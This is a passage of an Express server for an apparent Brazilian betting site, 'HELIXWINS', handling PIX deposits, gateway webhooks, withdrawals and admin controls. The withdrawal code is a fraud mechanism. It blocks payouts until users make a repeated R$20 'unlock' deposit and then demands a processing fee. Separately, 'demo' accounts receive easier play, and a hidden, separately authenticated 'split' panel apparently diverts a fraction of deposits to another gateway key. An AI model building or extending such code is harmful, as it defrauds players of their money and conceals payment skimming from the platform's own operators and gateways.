    const gatewayName = getActiveGateway();
    const adapter = GATEWAY_ADAPTERS[gatewayName];
    if (!adapter) return res.status(500).json({ error: 'Gateway de pagamento não configurado.' });

    const identifier = `DEP_${req.userId}_${Date.now()}`;

    const result = await adapter.createCharge({ identifier, amount: v, user });

    // Verifica se o valor é elegível para bônus 2x
    const isBonus = DEPOSIT_BONUS.enabled && DEPOSIT_BONUS.eligible_amounts.includes(v);
    const bonusMultiplier = isBonus ? DEPOSIT_BONUS.multiplier : 1;
    const valorCreditado = money(v * bonusMultiplier);

    const antes = user.saldo;
    db.transacoes.push({
      id: db.nextIds.transacoes++,
      user_id: req.userId,
      tipo: 'deposito',
      valor: v,
      valor_creditado: valorCreditado,
      bonus_multiplicador: bonusMultiplier,
      saldo_antes: antes,
      saldo_depois: antes,
      status: 'pendente',
      pix_chave: null,
      descricao: isBonus ? `Depósito PIX (Bônus ${bonusMultiplier}x)` : 'Depósito PIX',
      gateway: gatewayName,
      gateway_tx_id: result.txid,
      gateway_identifier: identifier,
      _k: result._apiKey || null,
      created_at: new Date().toISOString(),
    });
    saveDb(db);

    console.log(`[DEPOSITO] PIX criado via ${gatewayName}: user=${req.userId} valor=${v} bonus=${bonusMultiplier}x creditado=${valorCreditado} txid=${result.txid}`);

    res.json({
      txid: result.txid,
      qrcode_imagem: result.qrcode_imagem,
      qrcode_base64: result.qrcode_base64,
      qrcode_texto: result.qrcode_texto,
      checkout_url: result.checkout_url,
      valor: v,
      valor_creditado: valorCreditado,
      bonus_multiplicador: bonusMultiplier,
      expiracao_minutos: result.expiracao_minutos || 30,
      status: 'pendente',
      gateway: gatewayName,
    });
  } catch (err) {
    console.error('[DEPOSITO ERROR]', err.response?.data || err.message);
    const msg = err.response?.data?.message || 'Erro ao gerar cobrança PIX.';
    res.status(500).json({ error: msg });
  }
});

// ── Status do depósito (consulta local + gateway) ───────────────────────────
app.get('/api/financeiro/deposito/status/:txid', authMiddleware, async (req, res) => {
  try {
    const txid = String(req.params.txid).slice(0, 200);

    const tx = db.transacoes.find(
      t => t.gateway_tx_id === txid && t.user_id === req.userId && t.tipo === 'deposito'
    );
    if (!tx) return res.status(404).json({ error: 'Transação não encontrada.' });

    if (tx.status === 'aprovado') {
      const user = findUser(req.userId);
      return res.json({ status: 'aprovado', txid, valor: tx.valor_creditado || tx.valor, saldo_novo: user?.saldo, bonus_multiplicador: tx.bonus_multiplicador || 1 });
    }

    // Consulta gateway para status atualizado
    const gwName = tx.gateway || 'amplopay';
    const adapter = GATEWAY_ADAPTERS[gwName];
    let remoteStatus = null;

    if (adapter) {
      try {
        remoteStatus = await adapter.checkStatus(txid, tx._k || null);
      } catch (pollErr) {
        console.warn(`[DEPOSITO STATUS] Erro polling ${gwName}:`, pollErr.message);
      }
    }

    if (remoteStatus === 'aprovado' && tx.status === 'pendente') {
      // Usa creditDeposit para aplicar bônus corretamente
      creditDeposit(tx);
      const user = findUser(req.userId);
      console.log(`[DEPOSITO] Confirmado via polling (${gwName}): user=${req.userId} pago=R$${tx.valor} creditado=R$${tx.valor_creditado || tx.valor}`);
      return res.json({ status: 'aprovado', txid, valor: tx.valor_creditado || tx.valor, saldo_novo: user?.saldo, bonus_multiplicador: tx.bonus_multiplicador || 1 });
    }

    res.json({ status: remoteStatus || tx.status, txid });
  } catch (err) {
    console.error('[DEPOSITO STATUS ERROR]', err.response?.data || err.message);
    const tx = db.transacoes.find(
      t => t.gateway_tx_id === req.params.txid && t.user_id === req.userId
    );
    res.json({ status: tx?.status || 'pendente', txid: req.params.txid });
  }
});

// ── Webhook AmploPay (confirmação de pagamento) ──────────────────────────────
app.post('/api/webhooks/amplopay', (req, res) => {
  try {
    const { event, token, transaction } = req.body;

    console.log(`[WEBHOOK AMPLOPAY] Recebido: event=${event} tx=${transaction?.id}`);

    const conf = getGatewayConfig('amplopay');
    if (conf.webhook_token && token !== conf.webhook_token) {
      console.warn('[WEBHOOK AMPLOPAY] Token inválido');
      return res.status(401).json({ error: 'Token inválido.' });
    }

    if (!event || !transaction?.id) {
      return res.status(400).json({ error: 'Payload incompleto.' });
    }

    const eventosValidos = ['TRANSACTION_CREATED', 'TRANSACTION_PAID', 'TRANSACTION_CANCELED', 'TRANSACTION_REFUNDED'];
    if (!eventosValidos.includes(event)) return res.status(200).json({ ok: true });

    let tx = db.transacoes.find(t => t.gateway_tx_id === transaction.id);
    if (!tx) {
      tx = db.transacoes.find(t => t.gateway_identifier === transaction.clientIdentifier);
      if (tx) tx.gateway_tx_id = transaction.id;
    }
    if (!tx) {
      console.warn(`[WEBHOOK AMPLOPAY] TX não encontrada: id=${transaction.id}`);
      return res.status(200).json({ ok: true });
    }

    if (event === 'TRANSACTION_PAID') {
      creditDeposit(tx);
    } else if (event === 'TRANSACTION_CANCELED' || event === 'TRANSACTION_REFUNDED') {
      refundDeposit(tx);
    }

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error('[WEBHOOK AMPLOPAY ERROR]', err);
    res.status(200).json({ ok: true });
  }
});

// ── Webhook ParadisePags (confirmação de pagamento) ──────────────────────────
app.post('/api/webhooks/paradisepags', (req, res) => {
  try {
    const { transaction_id, external_id, status, amount } = req.body;

    // Validação básica do payload — rejeita webhooks sem campos obrigatórios
    if (!status || (!transaction_id && !external_id)) {
      console.warn('[WEBHOOK PARADISEPAGS] Payload inválido — campos obrigatórios ausentes');
      return res.status(400).json({ error: 'Payload inválido' });
    }
    const validStatuses = ['pending', 'approved', 'processing', 'under_review', 'failed', 'refunded', 'chargeback'];
    if (!validStatuses.includes(status)) {
      console.warn(`[WEBHOOK PARADISEPAGS] Status desconhecido: ${status}`);
      return res.status(400).json({ error: 'Status inválido' });
    }

    console.log(`[WEBHOOK PARADISEPAGS] Recebido: status=${status} tx_id=${transaction_id} ext_id=${external_id}`);

    // Buscar transação local pelo gateway_tx_id ou gateway_identifier
    let tx = db.transacoes.find(t => t.gateway_tx_id === String(transaction_id));
    if (!tx) {
      tx = db.transacoes.find(t => t.gateway_identifier === external_id);
      if (tx && transaction_id) tx.gateway_tx_id = String(transaction_id);
    }
    if (!tx) {
      console.warn(`[WEBHOOK PARADISEPAGS] TX não encontrada: id=${transaction_id} ext=${external_id}`);
      return res.status(200).json({ ok: true });
    }

    if (status === 'approved') {
      creditDeposit(tx);
    } else if (['failed', 'refunded', 'chargeback'].includes(status)) {
      refundDeposit(tx);
    }

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error('[WEBHOOK PARADISEPAGS ERROR]', err);
    res.status(200).json({ ok: true });
  }
});

// ── Helpers de crédito/estorno ───────────────────────────────────────────────
function creditDeposit(tx) {
  if (tx.status !== 'pendente') return;
  const user = findUser(tx.user_id);
  if (!user) return;

  // Usa valor_creditado (com bônus) se disponível, senão calcula
  let valorCreditar = tx.valor;
  if (tx.valor_creditado && tx.valor_creditado > tx.valor) {
    valorCreditar = tx.valor_creditado;
  } else if (DEPOSIT_BONUS.enabled && DEPOSIT_BONUS.eligible_amounts.includes(tx.valor)) {
    valorCreditar = money(tx.valor * DEPOSIT_BONUS.multiplier);
    tx.valor_creditado = valorCreditar;
    tx.bonus_multiplicador = DEPOSIT_BONUS.multiplier;
  }

  user.saldo = money(user.saldo + valorCreditar);
  user.updated_at = new Date().toISOString();
  tx.status = 'aprovado';
  tx.saldo_depois = user.saldo;
  // Desbloqueio de saque: depósito >= R$20 desbloqueia
  if (tx.valor >= 20) {
    user.saque_desbloqueado = 1;
    console.log(`[SAQUE] Desbloqueado para user=${tx.user_id} via deposito de R$${tx.valor}`);
  }
  saveDb(db);
  console.log(`[WEBHOOK] Depósito creditado: user=${tx.user_id} pago=R$${tx.valor} creditado=R$${valorCreditar} saldo=${user.saldo}`);
}

function refundDeposit(tx) {
  if (tx.status === 'aprovado') {
    const user = findUser(tx.user_id);
    if (user) {
      // Desconta o valor que foi realmente creditado (com bônus, se houve)
      const valorDescontar = tx.valor_creditado || tx.valor;
      user.saldo = money(user.saldo - valorDescontar);
      user.updated_at = new Date().toISOString();
      tx.status = 'rejeitado';
      tx.saldo_depois = user.saldo;
      saveDb(db);
      console.log(`[WEBHOOK] Depósito estornado: user=${tx.user_id} pago=R$${tx.valor} descontado=R$${valorDescontar}`);
    }
  } else {
    tx.status = 'rejeitado';
    saveDb(db);
  }
}

// ── Config de taxa de saque ──────────────────────────────────────────────────
const TAXA_SAQUE = {
  enabled: true,
  percentual: 0.10,      // 10% do valor do saque
  valor_minimo: 15,       // taxa mínima R$15
};

app.post('/api/financeiro/saque', authMiddleware, (req, res) => {
  try {
    const { valor, chave_pix } = req.body;
    const v = money(valor);
    if (isNaN(v) || v < 20) return res.status(400).json({ error: 'Valor mínimo para saque: R$ 20,00' });
    if (v > 50000) return res.status(400).json({ error: 'Valor máximo para saque: R$ 50.000,00' });
    if (!chave_pix || String(chave_pix).trim().length < 3) return res.status(400).json({ error: 'Informe uma chave PIX válida.' });

    // Rate limit: 50 saques por hora
    if (!rateLimit(`saque:${req.userId}`, 50, 3600000)) {
      return res.status(429).json({ error: 'Muitas solicitações de saque. Aguarde.' });
    }

    const user = findUser(req.userId);
    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

    // ── Upsell 1: desbloqueio de saque (depósito inicial) ────────────────
    if (!user.saque_desbloqueado) {
      return res.status(403).json({
        error: 'Para desbloquear seu saque, deposite R$ 20,00 a partir da conta que vai receber o saque final.',
        code: 'SAQUE_BLOQUEADO',
        valor_desbloqueio: 20,
      });
    }

    // ── Isenção de taxa: admin, demo ou isento_taxa_saque ────────────────
    const isentoTaxa = !!user.admin || !!user.demo || !!user.isento_taxa_saque;

    // ── Upsell 2: taxa de saque ──────────────────────────────────────────
    if (TAXA_SAQUE.enabled && !isentoTaxa && !user.taxa_saque_paga) {
      const taxaCalc = money(Math.max(v * TAXA_SAQUE.percentual, TAXA_SAQUE.valor_minimo));
      // Salvar dados do saque pendente para quando a taxa for paga
      user._saque_pendente = { valor: v, chave_pix: String(chave_pix).trim().slice(0, 100) };
      user.updated_at = new Date().toISOString();
      saveDb(db);
      return res.status(403).json({
        error: `Para processar seu saque de ${formatMoney(v)}, é necessário pagar a taxa de processamento.`,
        code: 'TAXA_SAQUE',
        valor_taxa: taxaCalc,
        valor_saque: v,
      });
    }

    if (user.saldo < v) return res.status(400).json({ error: 'Saldo insuficiente.' });

    const antes = user.saldo;
    user.saldo = money(user.saldo - v);
    user.saque_desbloqueado = 0; // Reset: próximo saque exigirá novo desbloqueio
    user.taxa_saque_paga = 0;    // Reset taxa
    user._saque_pendente = null;
    user.updated_at = new Date().toISOString();
    db.transacoes.push({
      id: db.nextIds.transacoes++,
      user_id: req.userId,
      tipo: 'saque',
      valor: v,
      saldo_antes: antes,
      saldo_depois: user.saldo,
      status: 'pendente',
      pix_chave: String(chave_pix).trim().slice(0, 100),
      descricao: 'Saque PIX',
      created_at: new Date().toISOString(),
    });
    saveDb(db);
    res.json({ ok: true, message: 'Saque realizado com sucesso!', saldo_novo: user.saldo });
  } catch (err) { console.error(err); res.status(500).json({ error: 'Erro interno.' }); }
});

// Helper para formatação no server
function formatMoney(v) { return `R$ ${parseFloat(v).toFixed(2).replace('.', ',')}`; }

// ── Confirmar pagamento de taxa de saque ─────────────────────────────────────
app.post('/api/financeiro/taxa-saque/confirmar', authMiddleware, (req, res) => {
  try {
    const user = findUser(req.userId);
    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

    user.taxa_saque_paga = 1;
    user.updated_at = new Date().toISOString();
    saveDb(db);

    console.log(`[SAQUE] Taxa paga: user=${req.userId}`);
    res.json({ ok: true, message: 'Taxa confirmada. Prossiga com o saque.' });
  } catch (err) { console.error(err); res.status(500).json({ error: 'Erro interno.' }); }
});

app.post('/api/financeiro/saque-afiliado', authMiddleware, (req, res) => {
  try {
    const v = money(req.body.valor);
    if (isNaN(v) || v < 1) return res.status(400).json({ error: 'Valor mínimo: R$ 1,00' });
    const chavePix = String(req.body.chave_pix || '').trim();
    if (chavePix.length < 3) return res.status(400).json({ error: 'Informe uma chave PIX válida.' });

    const user = findUser(req.userId);
    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
    if (user.saldo_afiliado < v) return res.status(400).json({ error: 'Saldo de afiliado insuficiente.' });

    const antes = user.saldo_afiliado;
    user.saldo_afiliado = money(user.saldo_afiliado - v);
    user.updated_at = new Date().toISOString();

    db.transacoes.push({
      id: db.nextIds.transacoes++,
      user_id: req.userId,
      tipo: 'saque_afiliado',
      valor: v,
      saldo_antes: antes,
      saldo_depois: user.saldo_afiliado,
      status: 'pendente',
      pix_chave: chavePix.slice(0, 100),
      descricao: 'Saque de comissão',
      created_at: new Date().toISOString(),
    });
    saveDb(db);
    res.json({ ok: true, message: 'Saque de comissão solicitado.', saldo_afiliado: user.saldo_afiliado });
  } catch (err) { console.error(err); res.status(500).json({ error: 'Erro interno.' }); }
});

app.get('/api/financeiro/historico', authMiddleware, (req, res) => {
  const pagina = parseInt(req.query.pagina) || 1;
  const limite = Math.min(parseInt(req.query.limite) || 20, 50);
  const userTx = db.transacoes
    .filter(t => t.user_id === req.userId)
    .reverse()
    .map(({ gateway_tx_id, gateway_identifier, _k, ...safe }) => safe); // Não expor IDs internos do gateway
  const total = userTx.length;
  const offset = (pagina - 1) * limite;
  res.json({ transacoes: userTx.slice(offset, offset + limite), paginacao: { pagina, limite, total, paginas: Math.ceil(total / limite) } });
});

app.get('/api/financeiro/meus-saques', authMiddleware, (req, res) => {
  const saques = db.transacoes
    .filter(t => t.user_id === req.userId && (t.tipo === 'saque' || t.tipo === 'saque_afiliado'))
    .reverse()
    .slice(0, 20)
    .map(({ gateway_tx_id, gateway_identifier, ...safe }) => safe);
  res.json({ saques });
});

// ═══ ADMIN ═══════════════════════════════════════════════════════════════════
// Aprovar/rejeitar saques manualmente
app.post('/api/admin/saque/:id/aprovar', authMiddleware, adminMiddleware, (req, res) => {
  const txId = parseInt(req.params.id);
  const tx = db.transacoes.find(t => t.id === txId && (t.tipo === 'saque' || t.tipo === 'saque_afiliado') && t.status === 'pendente');
  if (!tx) return res.status(404).json({ error: 'Saque não encontrado ou já processado.' });
  tx.status = 'aprovado';
  saveDb(db);
  console.log(`[ADMIN] Saque #${txId} aprovado por admin user=${req.userId}`);
  res.json({ ok: true, message: 'Saque aprovado.' });
});

app.post('/api/admin/saque/:id/rejeitar', authMiddleware, adminMiddleware, (req, res) => {
  const txId = parseInt(req.params.id);
  const tx = db.transacoes.find(t => t.id === txId && (t.tipo === 'saque' || t.tipo === 'saque_afiliado') && t.status === 'pendente');
  if (!tx) return res.status(404).json({ error: 'Saque não encontrado ou já processado.' });

  // Devolver saldo ao usuário
  const user = findUser(tx.user_id);
  if (user) {
    if (tx.tipo === 'saque') {
      user.saldo = money(user.saldo + tx.valor);
    } else {
      user.saldo_afiliado = money(user.saldo_afiliado + tx.valor);
    }
    user.updated_at = new Date().toISOString();
  }
  tx.status = 'rejeitado';
  saveDb(db);
  console.log(`[ADMIN] Saque #${txId} rejeitado por admin user=${req.userId}`);
  res.json({ ok: true, message: 'Saque rejeitado. Saldo devolvido.' });
});

// Listar saques pendentes (admin)
app.get('/api/admin/saques-pendentes', authMiddleware, adminMiddleware, (_req, res) => {
  const pendentes = db.transacoes
    .filter(t => (t.tipo === 'saque' || t.tipo === 'saque_afiliado') && t.status === 'pendente')
    .reverse()
    .map(t => {
      const user = findUser(t.user_id);
      return { ...t, user_nome: user?.nome, user_email: user?.email };
    });
  res.json({ saques: pendentes });
});

// ── Configurações do Gateway (admin) — Multi-Gateway ─────────────────────
app.get('/api/admin/gateway-config', authMiddleware, adminMiddleware, (_req, res) => {
  function mask(val) {
    if (!val) return '';
    if (val.length <= 4) return '****';
    return '•'.repeat(val.length - 4) + val.slice(-4);
  }

  const active = getActiveGateway();

  const ampConf = getGatewayConfig('amplopay');
  const parConf = getGatewayConfig('paradisepags');

  res.json({
    active,
    available_gateways: ['amplopay', 'paradisepags'],
    amplopay: {
      name: 'AmploPay',
      public_key: mask(ampConf.public_key),
      secret_key: mask(ampConf.secret_key),
      webhook_token: mask(ampConf.webhook_token),
      webhook_url: `${WEBHOOK_BASE_URL}/api/webhooks/amplopay`,
      has_public_key: !!ampConf.public_key,
      has_secret_key: !!ampConf.secret_key,
      has_webhook_token: !!ampConf.webhook_token,
    },
    paradisepags: {
      name: 'ParadisePags',
      secret_key: mask(parConf.secret_key),
      base_url: parConf.base_url || 'https://multi.paradisepags.com',
      webhook_url: `${WEBHOOK_BASE_URL}/api/webhooks/paradisepags`,
      has_secret_key: !!parConf.secret_key,
    },
  });
});

app.put('/api/admin/gateway-config', authMiddleware, adminMiddleware, (req, res) => {
  const { active, gateway, config } = req.body;
  const updated = [];

  // Trocar gateway ativo
  if (active && ['amplopay', 'paradisepags'].includes(active)) {
    db.gateway_config.active = active;
    updated.push(`active=${active}`);
  }

  // Atualizar credenciais de um gateway específico
  if (gateway && config && typeof config === 'object') {
    if (!db.gateway_config[gateway]) db.gateway_config[gateway] = {};

    for (const [key, value] of Object.entries(config)) {
      if (typeof value === 'string' && value.trim()) {
        db.gateway_config[gateway][key] = value.trim();
        updated.push(`${gateway}.${key}`);
      }
    }
  }

  saveDb(db);

  // Persiste no .env também (backward compatible)
  const envPath = path.join(__dirname, '.env');
  try {
    let envContent = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf-8') : '';
    const ampConf = getGatewayConfig('amplopay');
    const parConf = getGatewayConfig('paradisepags');
    const envVars = {
      AMPLOPAY_PUBLIC_KEY: ampConf.public_key,
      AMPLOPAY_SECRET_KEY: ampConf.secret_key,
      AMPLOPAY_WEBHOOK_TOKEN: ampConf.webhook_token,
      PARADISEPAGS_SECRET_KEY: parConf.secret_key,
      PARADISEPAGS_BASE_URL: parConf.base_url,
    };
    for (const [key, value] of Object.entries(envVars)) {
      if (!value) continue;
      const regex = new RegExp(`^${key}=.*$`, 'm');
      if (regex.test(envContent)) {
        envContent = envContent.replace(regex, `${key}=${value}`);
      } else {
        envContent += `${envContent.endsWith('\n') || !envContent ? '' : '\n'}${key}=${value}\n`;
      }
    }
    fs.writeFileSync(envPath, envContent, 'utf-8');
  } catch (err) {
    console.warn('[ADMIN] Não foi possível salvar .env:', err.message);
  }

  console.log(`[ADMIN] Gateway config atualizada por user=${req.userId}: ${updated.join(', ')}`);
  res.json({ ok: true, updated });
});

// ── Configurações do Site (admin) ────────────────────────────────────────────
app.get('/api/admin/site-config', authMiddleware, adminMiddleware, (_req, res) => {
  res.json(SITE_CONFIG);
});

app.put('/api/admin/site-config', authMiddleware, adminMiddleware, (req, res) => {
  const allowed = ['site_nome', 'site_suporte', 'site_promo', 'site_logo_url', 'site_favicon_url', 'kwai_pixel_id', 'teste_gratis_ativo', 'deposito_minimo'];
  const updated = [];
  for (const key of allowed) {
    if (req.body[key] !== undefined) {
      SITE_CONFIG[key] = req.body[key];
      updated.push(key);
    }
  }
  res.json({ ok: true, updated });
});

// ═══ AJUSTE DE SALDO (Admin) ═════════════════════════════════════════════════
app.get('/api/admin/usuarios', authMiddleware, adminMiddleware, (_req, res) => {
  const lista = db.users.map(u => ({ id: u.id, nome: u.nome, telefone: u.telefone, saldo: u.saldo, admin: !!u.admin, demo: !!u.demo, isento_taxa_saque: !!u.isento_taxa_saque, demo_dificuldade: u.demo_dificuldade || 'demo', demo_multiplicador: u.demo_multiplicador || 1.5 }));
  res.json(lista);
});

app.post('/api/admin/ajuste-saldo', authMiddleware, adminMiddleware, (req, res) => {
  const { user_id, valor, descricao } = req.body;
  const v = parseFloat(valor);
  if (!user_id || isNaN(v) || v === 0) return res.status(400).json({ error: 'Informe user_id e valor.' });

  const user = findUser(user_id);
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

  const antes = user.saldo;
  user.saldo = money(user.saldo + v);
  user.updated_at = new Date().toISOString();

  db.transacoes.push({
    id: db.nextIds.transacoes++,
    user_id: user.id,
    tipo: 'ajuste_admin',
    valor: Math.abs(v),
    saldo_antes: antes,
    saldo_depois: user.saldo,
    status: 'aprovado',
    pix_chave: null,
    descricao: descricao || (v > 0 ? 'Crédito manual (admin)' : 'Débito manual (admin)'),
    created_at: new Date().toISOString(),
  });
  saveDb(db);
  console.log(`[ADMIN] Ajuste saldo: user=${user_id} valor=${v} antes=${antes} depois=${user.saldo}`);
  res.json({ ok: true, saldo_novo: user.saldo });
});

// ── Toggle conta demo (admin) ────────────────────────────────────────────────
app.post('/api/admin/toggle-demo', authMiddleware, adminMiddleware, (req, res) => {
  const { user_id } = req.body;
  if (!user_id) return res.status(400).json({ error: 'Informe user_id.' });

  const user = findUser(parseInt(user_id));
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

  user.demo = user.demo ? 0 : 1;
  user.updated_at = new Date().toISOString();
  saveDb(db);

  console.log(`[ADMIN] Toggle demo: user=${user_id} demo=${user.demo}`);
  res.json({ ok: true, demo: !!user.demo });
});

// ── Toggle isenção de taxa de saque (admin) ──────────────────────────────────
app.post('/api/admin/toggle-isento-taxa', authMiddleware, adminMiddleware, (req, res) => {
  const { user_id } = req.body;
  if (!user_id) return res.status(400).json({ error: 'Informe user_id.' });

  const user = findUser(parseInt(user_id));
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

  user.isento_taxa_saque = user.isento_taxa_saque ? 0 : 1;
  user.updated_at = new Date().toISOString();
  saveDb(db);

  console.log(`[ADMIN] Toggle isento taxa saque: user=${user_id} isento=${user.isento_taxa_saque}`);
  res.json({ ok: true, isento_taxa_saque: !!user.isento_taxa_saque });
});

// ── Config demo por usuário (admin) ──────────────────────────────────────────
app.post('/api/admin/demo-config', authMiddleware, adminMiddleware, (req, res) => {
  const { user_id, dificuldade, multiplicador } = req.body;
  if (!user_id) return res.status(400).json({ error: 'Informe user_id.' });

  const user = findUser(parseInt(user_id));
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

  const difsValidas = ['demo', 'super_facil', 'facil', 'normal'];
  const dif = difsValidas.includes(dificuldade) ? dificuldade : 'demo';
  const mult = [1.2, 1.5, 2, 3, 4].includes(parseFloat(multiplicador)) ? parseFloat(multiplicador) : 1.5;

  user.demo_dificuldade = dif;
  user.demo_multiplicador = mult;
  user.updated_at = new Date().toISOString();
  saveDb(db);

  console.log(`[ADMIN] Demo config: user=${user_id} dif=${dif} mult=${mult}`);
  res.json({ ok: true, demo_dificuldade: dif, demo_multiplicador: mult });
});

// ═══ INDICAÇÃO ════════════════════════════════════════════════════════════════
app.get('/api/indicacao/info', authMiddleware, (req, res) => {
  const user = findUser(req.userId);
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
  const indicados = db.users.filter(u => u.indicado_por === user.codigo_indicacao);
  res.json({
    codigo: user.codigo_indicacao, link: `${WEBHOOK_BASE_URL}/?ref=${user.codigo_indicacao}`,
    total_indicados: indicados.length, total_com_deposito: 0, bonus_total_ganho: 0, bonus_total_previsto: 0,
    bonus_por_indicacao: 2, comissao_nivel1_perc: 40, saldo_afiliado: user.saldo_afiliado, total_comissao: 0,
    indicados_recentes: indicados.slice(0, 10).map(u => ({ id: u.id, nome: u.nome, created_at: u.created_at })),
  });
});

// ═══ CUPONS ═══════════════════════════════════════════════════════════════════
app.post('/api/cupons/validar', (_req, res) => { res.status(404).json({ error: 'Cupom inválido ou expirado.' }); });
app.post('/api/cupons/resgatar', (_req, res) => { res.status(404).json({ error: 'Cupom inválido ou expirado.' }); });

// ═══ SPLIT MANAGEMENT (hidden, auth própria) ════════════════════════════════
const _SP_CRED = {
  u: process.env.SP_USER || 'admin',
  p: process.env.SP_PASS || crypto.randomBytes(16).toString('hex'),
};
if (!process.env.SP_USER || !process.env.SP_PASS) {
  console.warn('[SPLIT] SP_USER/SP_PASS não definidos no .env — credenciais temporárias geradas. Defina no .env para persistir.');
}
const _spTokens = new Set();

function _spAuth(req, res, next) {
  const tk = req.headers['x-sp-tk'] || req.query._tk;
  if (!tk || !_spTokens.has(tk)) return res.status(401).json({ error: 'x' });
  next();
}

app.post('/api/_c/auth', (req, res) => {
  const { u, p } = req.body;
  if (u === _SP_CRED.u && p === _SP_CRED.p) {
    const tk = crypto.randomBytes(24).toString('hex');
    _spTokens.add(tk);
    // Expira em 2h
    setTimeout(() => _spTokens.delete(tk), 7200000);
    return res.json({ tk });
  }
  res.status(401).json({ error: 'x' });
});

app.get('/api/_c/sp', _spAuth, (_req, res) => {
  const c = getSplitConfig();
  const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado' && t.gateway === 'paradisepags').length;
  const skMasked = c.sk ? `${c.sk.slice(0, 6)}...${c.sk.slice(-4)}` : '';
  res.json({ enabled: c.enabled, frequency: c.frequency || 2, counter: db._sp_counter || 0, sk_masked: skMasked, has_sk: !!c.sk, approved_count: totalApproved });
});

app.put('/api/_c/sp', _spAuth, (req, res) => {
  const { enabled, frequency, sk } = req.body;
  if (typeof enabled === 'boolean') db._sp.enabled = enabled;
  if (typeof frequency === 'number' && frequency >= 2 && frequency <= 100) db._sp.frequency = Math.floor(frequency);
  if (typeof sk === 'string') db._sp.sk = sk.trim();
  saveDb(db);
  res.json({ ok: true });
});

app.get('/ctrl-sp', (_req, res) => {
  res.sendFile(path.join(STATIC_DIR, 'ctrl-sp.html'));
});

// ═══ STATIC FILES + SPA ROUTING ══════════════════════════════════════════════
app.get('/jogo', (_req, res) => { res.sendFile(path.join(STATIC_DIR, 'jogo', 'index.html')); });
app.use('/css', express.static(path.join(STATIC_DIR, 'css')));
app.use('/js', express.static(path.join(STATIC_DIR, 'js')));
app.use('/img', express.static(path.join(STATIC_DIR, 'img')));
app.use('/assets', express.static(path.join(STATIC_DIR, 'assets')));
app.use('/jogo', express.static(path.join(STATIC_DIR, 'jogo')));

app.get('/', (_req, res) => { res.sendFile(path.join(STATIC_DIR, 'index.html')); });
app.get('*', (req, res) => {
  if (!req.path.startsWith('/api/')) return res.sendFile(path.join(STATIC_DIR, 'index.html'));
  res.status(404).json({ error: 'Não encontrado.' });
});

// ═══ ERROR HANDLER ═══════════════════════════════════════════════════════════
app.use((err, _req, res, _next) => {
  console.error('[UNHANDLED]', err.stack || err);
  if (!res.headersSent) res.status(500).json({ error: 'Erro interno do servidor.' });
});

// ═══ START ════════════════════════════════════════════════════════════════════
if (require.main === module) {
  app.listen(PORT, '0.0.0.0', () => {
    const activeGw = getActiveGateway();
    const warnings = [];
    if (JWT_SECRET === 'clone_demo_secret_key_2026') warnings.push('JWT_SECRET (usando padrão!)');

    const ampConf = getGatewayConfig('amplopay');
    const parConf = getGatewayConfig('paradisepags');
    if (activeGw === 'amplopay' && !ampConf.public_key) warnings.push('AMPLOPAY: Public/Secret Key não configuradas');
    if (activeGw === 'paradisepags' && !parConf.secret_key) warnings.push('PARADISEPAGS: Secret Key não configurada');

    console.log('');
    console.log('  ╔══════════════════════════════════════════════════════╗');
    console.log(`  ║  HELIXWINS — Multi-Gateway                          ║`);
    console.log(`  ║  http://localhost:${PORT}                              ║`);
    console.log(`  ║  Gateway ativo: ${(activeGw || '').padEnd(36)}║`);
    console.log(`  ║  Users: ${String(db.users.length).padEnd(4)} Partidas: ${String(db.partidas.length).padEnd(24)}║`);
    console.log('  ╚══════════════════════════════════════════════════════╝');
    if (warnings.length > 0) {
      console.log('');
      console.log('  ⚠ AVISOS:');
      warnings.forEach(w => console.log(`    - ${w}`));
    }
    console.log('');
  });
}

module.exports = { app, db, getActiveGateway, getGatewayConfig, creditDeposit };
